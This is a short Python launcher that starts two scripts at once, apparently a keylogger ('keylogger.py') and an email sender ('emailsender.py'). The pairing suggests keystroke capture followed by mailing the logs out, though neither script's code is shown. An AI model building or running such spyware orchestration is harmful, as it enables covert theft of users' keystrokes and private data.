import subprocess

if __name__ == '__main__':
    keylog_script = 'python keylogger.py'
    email_script = 'python emailsender.py'

    subprocess.Popen(keylog_script, shell=True)
    subprocess.Popen(email_script, shell=True)
    